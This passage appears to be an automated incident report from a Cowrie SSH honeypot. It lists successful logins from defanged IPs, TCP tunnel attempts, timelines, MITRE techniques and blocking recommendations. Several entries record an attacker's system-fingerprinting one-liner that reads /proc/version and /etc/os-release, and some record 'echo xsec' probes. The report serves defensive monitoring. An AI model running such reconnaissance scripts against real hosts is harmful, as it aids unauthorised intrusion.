| `2026-08-16 01:57:25` | `cowrie.login.success` |
| `2026-08-16 01:57:26` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d64d613cd60e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-08-16 01:57 |
| **Last Seen** | 2026-08-16 01:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:57:32` | `cowrie.session.connect` |
| `2026-08-16 01:57:33` | `cowrie.client.version` |
| `2026-08-16 01:57:33` | `cowrie.client.kex` |
| `2026-08-16 01:57:35` | `cowrie.login.success` |
| `2026-08-16 01:57:35` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed1a5409452

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:57 |
| **Last Seen** | 2026-08-16 01:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:57:51` | `cowrie.session.connect` |
| `2026-08-16 01:57:52` | `cowrie.client.version` |
| `2026-08-16 01:57:52` | `cowrie.client.kex` |
| `2026-08-16 01:57:58` | `cowrie.login.success` |
| `2026-08-16 01:58:01` | `cowrie.session.params` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:01` | `cowrie.command.success` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:01` | `cowrie.command.input` |
| `2026-08-16 01:58:02` | `cowrie.log.closed` |
| `2026-08-16 01:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e78403118f0e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:58 |
| **Last Seen** | 2026-08-16 01:59 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:58:51` | `cowrie.session.connect` |
| `2026-08-16 01:58:51` | `cowrie.client.version` |
| `2026-08-16 01:58:51` | `cowrie.client.kex` |
| `2026-08-16 01:58:58` | `cowrie.login.success` |
| `2026-08-16 01:59:00` | `cowrie.session.params` |
| `2026-08-16 01:59:00` | `cowrie.command.input` |
| `2026-08-16 01:59:00` | `cowrie.command.input` |
| `2026-08-16 01:59:00` | `cowrie.command.input` |
| `2026-08-16 01:59:00` | `cowrie.command.input` |
| `2026-08-16 01:59:00` | `cowrie.command.input` |
| `2026-08-16 01:59:00` | `cowrie.command.success` |
| `2026-08-16 01:59:00` | `cowrie.command.input` |
| `2026-08-16 01:59:01` | `cowrie.command.input` |
| `2026-08-16 01:59:01` | `cowrie.command.input` |
| `2026-08-16 01:59:01` | `cowrie.command.input` |
| `2026-08-16 01:59:02` | `cowrie.log.closed` |
| `2026-08-16 01:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-935badeef908

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:59 |
| **Last Seen** | 2026-08-16 01:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:59:49` | `cowrie.session.connect` |
| `2026-08-16 01:59:49` | `cowrie.client.version` |
| `2026-08-16 01:59:49` | `cowrie.client.kex` |
| `2026-08-16 01:59:54` | `cowrie.login.success` |
| `2026-08-16 01:59:56` | `cowrie.session.params` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:56` | `cowrie.command.success` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:56` | `cowrie.command.input` |
| `2026-08-16 01:59:57` | `cowrie.log.closed` |
| `2026-08-16 01:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0d54342721b

| Field | Detail |
|---|---|
| **Source IP** | `106.89.59[.]63` |
| **First Seen** | 2026-08-16 02:00 |
| **Last Seen** | 2026-08-16 02:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:00:19` | `cowrie.session.connect` |
| `2026-08-16 02:00:20` | `cowrie.client.version` |
| `2026-08-16 02:00:20` | `cowrie.client.kex` |
| `2026-08-16 02:00:21` | `cowrie.login.success` |
| `2026-08-16 02:00:22` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.59[.]63` to AbuseIPDB if not already reported
- [ ] Block `106.89.59[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63af2ae1c880

| Field | Detail |
|---|---|
| **Source IP** | `175.100.107[.]238` |
| **First Seen** | 2026-08-16 02:00 |
| **Last Seen** | 2026-08-16 02:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:00:27` | `cowrie.session.connect` |
| `2026-08-16 02:00:31` | `cowrie.client.version` |
| `2026-08-16 02:00:31` | `cowrie.client.kex` |
| `2026-08-16 02:00:33` | `cowrie.login.success` |
| `2026-08-16 02:00:35` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.100.107[.]238` to AbuseIPDB if not already reported
- [ ] Block `175.100.107[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253db689066b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:00 |
| **Last Seen** | 2026-08-16 02:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:00:45` | `cowrie.session.connect` |
| `2026-08-16 02:00:47` | `cowrie.client.version` |
| `2026-08-16 02:00:47` | `cowrie.client.kex` |
| `2026-08-16 02:00:51` | `cowrie.login.success` |
| `2026-08-16 02:00:55` | `cowrie.session.params` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:55` | `cowrie.command.success` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:55` | `cowrie.command.input` |
| `2026-08-16 02:00:56` | `cowrie.log.closed` |
| `2026-08-16 02:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a52a29d230

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:01 |
| **Last Seen** | 2026-08-16 02:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:01:46` | `cowrie.session.connect` |
| `2026-08-16 02:01:48` | `cowrie.client.version` |
| `2026-08-16 02:01:48` | `cowrie.client.kex` |
| `2026-08-16 02:01:52` | `cowrie.login.success` |
| `2026-08-16 02:01:55` | `cowrie.session.params` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:55` | `cowrie.command.success` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:55` | `cowrie.command.input` |
| `2026-08-16 02:01:56` | `cowrie.log.closed` |
| `2026-08-16 02:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d192f659a782

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 02:02 |
| **Last Seen** | 2026-08-16 02:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:02:38` | `cowrie.session.connect` |
| `2026-08-16 02:02:38` | `cowrie.client.version` |
| `2026-08-16 02:02:38` | `cowrie.client.kex` |
| `2026-08-16 02:02:38` | `cowrie.login.success` |
| `2026-08-16 02:02:39` | `cowrie.session.params` |
| `2026-08-16 02:02:39` | `cowrie.command.input` |
| `2026-08-16 02:02:39` | `cowrie.log.closed` |
| `2026-08-16 02:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba90d1db1d29

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:02 |
| **Last Seen** | 2026-08-16 02:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:02:43` | `cowrie.session.connect` |
| `2026-08-16 02:02:44` | `cowrie.client.version` |
| `2026-08-16 02:02:44` | `cowrie.client.kex` |
| `2026-08-16 02:02:48` | `cowrie.login.success` |
| `2026-08-16 02:02:50` | `cowrie.session.params` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:50` | `cowrie.command.success` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:50` | `cowrie.command.input` |
| `2026-08-16 02:02:52` | `cowrie.log.closed` |
| `2026-08-16 02:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ef9344825e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:03 |
| **Last Seen** | 2026-08-16 02:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:03:39` | `cowrie.session.connect` |
| `2026-08-16 02:03:40` | `cowrie.client.version` |
| `2026-08-16 02:03:40` | `cowrie.client.kex` |
| `2026-08-16 02:03:42` | `cowrie.login.success` |
| `2026-08-16 02:03:44` | `cowrie.session.params` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:44` | `cowrie.command.success` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:44` | `cowrie.command.input` |
| `2026-08-16 02:03:45` | `cowrie.log.closed` |
| `2026-08-16 02:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9475be3f53a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:04 |
| **Last Seen** | 2026-08-16 02:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:04:35` | `cowrie.session.connect` |
| `2026-08-16 02:04:36` | `cowrie.client.version` |
| `2026-08-16 02:04:36` | `cowrie.client.kex` |
| `2026-08-16 02:04:40` | `cowrie.login.success` |
| `2026-08-16 02:04:42` | `cowrie.session.params` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:42` | `cowrie.command.success` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:42` | `cowrie.command.input` |
| `2026-08-16 02:04:44` | `cowrie.log.closed` |
| `2026-08-16 02:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7c0e0076cf

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 02:04 |
| **Last Seen** | 2026-08-16 02:05 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:04:50` | `cowrie.session.connect` |
| `2026-08-16 02:04:55` | `cowrie.client.version` |
| `2026-08-16 02:04:55` | `cowrie.client.kex` |
| `2026-08-16 02:05:19` | `cowrie.login.success` |
| `2026-08-16 02:05:30` | `cowrie.session.params` |
| `2026-08-16 02:05:30` | `cowrie.command.input` |
| `2026-08-16 02:05:36` | `cowrie.log.closed` |
| `2026-08-16 02:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80b85c7c8600

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:05 |
| **Last Seen** | 2026-08-16 02:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:05:32` | `cowrie.session.connect` |
| `2026-08-16 02:05:33` | `cowrie.client.version` |
| `2026-08-16 02:05:33` | `cowrie.client.kex` |
| `2026-08-16 02:05:36` | `cowrie.login.success` |
| `2026-08-16 02:05:39` | `cowrie.session.params` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:39` | `cowrie.command.success` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:39` | `cowrie.command.input` |
| `2026-08-16 02:05:40` | `cowrie.log.closed` |
| `2026-08-16 02:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6059b556bd7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:06 |
| **Last Seen** | 2026-08-16 02:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:06:29` | `cowrie.session.connect` |
